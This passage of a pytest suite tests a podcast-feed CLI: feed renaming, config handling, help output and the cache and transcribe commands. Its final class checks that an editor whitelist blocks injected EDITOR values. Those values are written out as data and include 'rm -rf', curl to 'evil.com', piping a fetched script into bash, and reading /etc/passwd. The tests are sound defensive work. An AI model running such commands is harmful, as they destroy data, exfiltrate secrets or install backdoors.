        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "old-name" not in feeds
        assert "new-name" in feeds
        assert feeds["new-name"].display_name == "New Name!"
        assert feeds["new-name"].category == "tech"
        assert "Normalized" in result.output


class TestCLIConfig:
    """Tests for config command."""

    def test_config_show(self, tmp_path: Path, monkeypatch) -> None:
        """Test showing configuration."""
        manager = ConfigManager(config_dir=tmp_path)

        config = manager.load_config()

        # Verify default values
        assert config.log_level == "INFO"
        # youtube_check is now in nested transcription config
        assert config.transcription.youtube_check is True

    def test_config_set(self, tmp_path: Path) -> None:
        """Test setting configuration value."""
        manager = ConfigManager(config_dir=tmp_path)

        config = manager.load_config()

        # Change a value
        config.log_level = "DEBUG"
        manager.save_config(config)

        # Reload and verify
        config_reloaded = manager.load_config()
        assert config_reloaded.log_level == "DEBUG"

    def test_config_roundtrip(self, tmp_path: Path) -> None:
        """Test that config can be saved and loaded."""
        manager = ConfigManager(config_dir=tmp_path)

        original = manager.load_config()
        original.log_level = "DEBUG"
        original.youtube_check = False

        manager.save_config(original)

        # Reload
        reloaded = manager.load_config()

        # Verify
        assert reloaded.log_level == "DEBUG"
        assert reloaded.youtube_check is False


class TestCLIHelp:
    """Tests for help output."""

    def test_help_command(self) -> None:
        """Test --help shows commands."""
        result = runner.invoke(app, ["--help"])

        assert result.exit_code == 0
        assert "version" in result.stdout
        assert "add" in result.stdout
        assert "list" in result.stdout
        assert "remove" in result.stdout
        assert "config" in result.stdout

    def test_add_help(self) -> None:
        """Test add command help."""
        result = runner.invoke(app, ["add", "--help"])

        assert result.exit_code == 0
        assert "RSS feed URL" in result.stdout
        assert "--name" in result.stdout
        assert "--auth" in result.stdout

    def test_list_help(self) -> None:
        """Test list command help."""
        result = runner.invoke(app, ["list", "--help"])

        assert result.exit_code == 0
        assert "configured podcast feeds" in result.stdout.lower()

    def test_remove_help(self) -> None:
        """Test remove command help."""
        result = runner.invoke(app, ["remove", "--help"])

        assert result.exit_code == 0
        assert "--force" in result.stdout

    def test_config_help(self) -> None:
        """Test config command help."""
        result = runner.invoke(app, ["config", "--help"])

        assert result.exit_code == 0
        assert "show" in result.stdout.lower()
        assert "edit" in result.stdout.lower()
        assert "set" in result.stdout.lower()

    def test_fetch_help_shows_new_options(self) -> None:
        """Test fetch command help shows --output-dir and --podcast-name."""
        result = runner.invoke(app, ["fetch", "--help"])

        assert result.exit_code == 0
        # New flag names
        assert "--output-dir" in result.stdout
        assert "--podcast-name" in result.stdout
        # Short forms
        assert "-o" in result.stdout
        assert "-n" in result.stdout


class TestCLIErrorHandling:
    """Tests for CLI error handling."""

    def test_no_args_shows_help(self) -> None:
        """Test that running without args shows help."""
        result = runner.invoke(app, [])

        # Typer with no_args_is_help=True shows help and exits with 2
        assert result.exit_code in (0, 2)  # Exit code varies by typer version
        assert "Transform podcast episodes" in result.stdout

    def test_invalid_command(self) -> None:
        """Test that invalid command shows error."""
        result = runner.invoke(app, ["invalid-command"])

        assert result.exit_code != 0


class TestCLITranscribe:
    """Tests for transcribe command."""

    def test_transcribe_help(self) -> None:
        """Test transcribe command help."""
        result = runner.invoke(app, ["transcribe", "--help"])

        assert result.exit_code == 0
        assert "transcribe" in result.stdout.lower()
        assert "--output" in result.stdout
        assert "--force" in result.stdout
        assert "--skip-youtube" in result.stdout

    def test_transcribe_missing_url(self) -> None:
        """Test transcribe command without URL argument."""
        result = runner.invoke(app, ["transcribe"])

        assert result.exit_code != 0
        # Typer returns exit code 2 for missing arguments


class TestCLICache:
    """Tests for cache command."""

    def test_cache_help(self) -> None:
        """Test cache command help."""
        result = runner.invoke(app, ["cache", "--help"])

        assert result.exit_code == 0
        assert "cache" in result.stdout.lower()
        assert "stats" in result.stdout or "clear" in result.stdout

    def test_cache_missing_action(self) -> None:
        """Test cache command without action argument."""
        result = runner.invoke(app, ["cache"])

        assert result.exit_code != 0
        # Typer returns exit code 2 for missing arguments

    def test_cache_stats(self, tmp_path: Path) -> None:
        """Test cache stats command."""
        # This test just verifies the command runs without error
        # Actual caching behavior is tested in unit tests
        result = runner.invoke(app, ["cache", "stats"])

        # May succeed (0) or fail gracefully depending on cache state
        # Main goal is to ensure command is registered and parseable
        assert result.exit_code in (0, 1)

    def test_cache_invalid_action(self) -> None:
        """Test cache command with invalid action."""
        result = runner.invoke(app, ["cache", "invalid-action"])

        # Command should complete but may show error for invalid action
        # This tests that the command is registered and handles bad input
        assert "invalid" in result.stdout.lower() or result.exit_code != 0


class TestCLIConfigEditSecurity:
    """Security tests for config edit command - CRITICAL vulnerability tests."""

    def test_editor_whitelist_allows_valid_editors(self, tmp_path: Path, monkeypatch) -> None:
        """Test that whitelisted editors are allowed."""
        manager = ConfigManager(config_dir=tmp_path)

        valid_editors = [
            "nano",
            "vim",
            "vi",
            "emacs",
            "code",
            "nvim",
            "subl",
            "gedit",
            "kate",
            "atom",
            "micro",
            "helix",
        ]

        for editor in valid_editors:
            # Mock the subprocess.run to prevent actual editor launch
            from unittest.mock import MagicMock, patch

            mock_run = MagicMock()
            with patch("subprocess.run", mock_run):
                monkeypatch.setenv("EDITOR", editor)
                result = runner.invoke(app, ["config", "edit"])

                # Should not show unsupported editor error
                assert "Unsupported editor" not in result.stdout
                # Subprocess should have been called with the editor
                assert mock_run.called

    def test_editor_whitelist_blocks_invalid_editors(self, tmp_path: Path, monkeypatch) -> None:
        """Test that non-whitelisted editors are blocked."""
        manager = ConfigManager(config_dir=tmp_path)

        invalid_editors = ["bash", "sh", "python", "perl", "ruby", "node", "custom-editor-2023"]

        for editor in invalid_editors:
            monkeypatch.setenv("EDITOR", editor)
            result = runner.invoke(app, ["config", "edit"])

            # Should show unsupported editor error
            assert "Unsupported editor" in result.stdout
            assert result.exit_code == 1

    def test_editor_command_injection_blocked(self, tmp_path: Path, monkeypatch) -> None:
        """Test that command injection attempts are blocked - CRITICAL SECURITY TEST."""
        manager = ConfigManager(config_dir=tmp_path)

        config = manager.load_config()
        manager.save_config(config)

        # Attack scenarios from security review
        injection_attempts = [
            "rm -rf ~ #",  # Delete home directory
            "curl evil.com/steal #",  # Data exfiltration
            "bash -c 'curl evil.com/backdoor.sh | bash' #",  # Backdoor installation
            "echo hacked > /tmp/pwned; vim",  # Command chaining
            "vim; rm -rf /",  # Semicolon separator
            "vim && rm -rf ~",  # AND operator
            "vim || rm -rf ~",  # OR operator
            "vim | cat /etc/passwd",  # Pipe operator
            "$(rm -rf ~)",  # Command substitution
            "`rm -rf ~`",  # Backtick substitution
        ]

        for injection in injection_attempts:
            monkeypatch.setenv("EDITOR", injection)
            result = runner.invoke(app, ["config", "edit"])

            # All injection attempts should be blocked
            assert "Unsupported editor" in result.stdout
            assert result.exit_code == 1
            # Verify config file still exists (wasn't deleted)
            assert manager.config_file.exists()

    def test_editor_path_handling(self, tmp_path: Path, monkeypatch) -> None:
        """Test that editor paths are correctly handled (only basename checked)."""
        manager = ConfigManager(config_dir=tmp_path)

        # Valid editor with path should work
        from unittest.mock import MagicMock, patch

        mock_run = MagicMock()
        with patch("subprocess.run", mock_run):
            monkeypatch.setenv("EDITOR", "/usr/bin/vim")
            result = runner.invoke(app, ["config", "edit"])

            # Should extract 'vim' from path and allow it
            assert "Unsupported editor" not in result.stdout
            assert mock_run.called

    def test_editor_path_injection_blocked(self, tmp_path: Path, monkeypatch) -> None:
        """Test that path-based injection attempts are blocked."""
        manager = ConfigManager(config_dir=tmp_path)

        # Malicious paths that should be blocked
        malicious_paths = [
            "/usr/bin/rm",
            "/bin/bash",
            "/usr/bin/curl",
            "../../bin/sh",
            "/tmp/malicious-script",
        ]

        for path in malicious_paths:
            monkeypatch.setenv("EDITOR", path)
            result = runner.invoke(app, ["config", "edit"])

            # Should be blocked (basename not in whitelist)
            assert "Unsupported editor" in result.stdout
            assert result.exit_code == 1

    def test_editor_default_fallback(self, tmp_path: Path, monkeypatch) -> None:
        """Test that default editor (nano) is used when EDITOR not set."""
        manager = ConfigManager(config_dir=tmp_path)

        from unittest.mock import MagicMock, patch

        # Unset EDITOR
        monkeypatch.delenv("EDITOR", raising=False)

        mock_run = MagicMock()
        with patch("subprocess.run", mock_run):
            result = runner.invoke(app, ["config", "edit"])

            # Should use nano as default
            assert mock_run.called
            # First argument to subprocess.run should be list starting with 'nano'
            call_args = mock_run.call_args[0][0]
            assert call_args[0] == "nano"
